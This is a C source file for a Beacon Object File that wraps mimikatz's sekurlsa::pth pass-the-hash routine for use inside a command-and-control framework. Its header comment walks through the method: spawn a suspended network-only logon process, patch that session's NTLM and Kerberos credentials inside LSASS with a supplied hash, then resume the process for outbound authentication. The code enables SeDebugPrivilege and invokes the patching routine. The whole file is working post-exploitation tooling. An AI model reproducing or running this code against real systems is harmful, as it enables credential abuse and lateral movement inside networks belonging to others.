/*
 * pth_bof.c — Pass-the-Hash BOF (sekurlsa::pth), ORIGINAL mimikatz method.
 *
 * Thin wrapper around mimikatz's kuhl_m_sekurlsa_pth().  With /user + /domain
 * and an NTLM hash (and/or AES keys), the ORIGINAL approach is:
 *
 *   1. CreateProcessWithLogonW(user, domain, "", LOGON_NETCREDENTIALS_ONLY,
 *        ..., CREATE_SUSPENDED) — a brand-new network-only logon session whose
 *        password is an empty string and is therefore never validated against
 *        the DC.
 *   2. Read that session's AuthenticationId (LUID) from the process token.
 *   3. Patch the MSV1_0 (NTLM) and Kerberos (AES) primary credentials for that
 *        LUID inside LSASS with the supplied hash/keys.
 *   4. Resume the suspended process; every outbound network auth from it
 *        (SMB, WMI, DCOM, LDAP, Kerberos pre-auth) now uses the patched hash.
 *
 *   /luid:<n>      patch an existing session in place instead of spawning.
 *   /impersonate   swap the CURRENT thread token to the patched session
 *                  instead of spawning cmd.exe.
 *   /run:<prog>    program to spawn (default: cmd.exe).
 */
#include "bofdefs.h"
#include "go_common.h"
#include "globals.h"
#include "kull_m_output.h"
#include "sekurlsa/kuhl_m_sekurlsa.h"
#include "kull_m_string.h"

/* buffered output (bof_output.c) */
void bof_output_flush(void);

/* DFR: route unqualified advapi32 imports through the ADVAPI32$ path so the
 * CoffeeLdr resolves them via LoadLibrary+GetProcAddress. */
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
#define OpenProcessToken      ADVAPI32$OpenProcessToken
#define LookupPrivilegeValueA ADVAPI32$LookupPrivilegeValueA
#define AdjustTokenPrivileges ADVAPI32$AdjustTokenPrivileges
#define CloseHandle           KERNEL32$CloseHandle

NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[]);

static void enable_se_debug_privilege(void) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return;
    }
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
}

DECLSPEC_EXPORT void go(char* args, int len) {
    int argc = 0;
    wchar_t** argv = NULL;

    bof_get_nt_version();
    kull_m_output_init();
    enable_se_debug_privilege();

    argv = bof_argv_from_utf8(args, len, &argc);
    if (!argv || argc < 1) {
        kprintf(L"[!] pth: see /h for usage. Required: /user /domain /ntlm (or /aes256).\n");
        bof_output_flush();
        if (argv) bof_argv_free(argv);
        return;
    }

    /* ORIGINAL sekurlsa::pth — spawns a sacrificial process
     * (CreateProcessWithLogonW + LOGON_NETCREDENTIALS_ONLY + empty password)
     * unless /luid or /impersonate is given, then patches that LUID's
     * MSV1_0 + Kerberos credentials in LSASS and resumes it. */
    kuhl_m_sekurlsa_pth(argc, argv);

    bof_output_flush();
    bof_argv_free(argv);
}
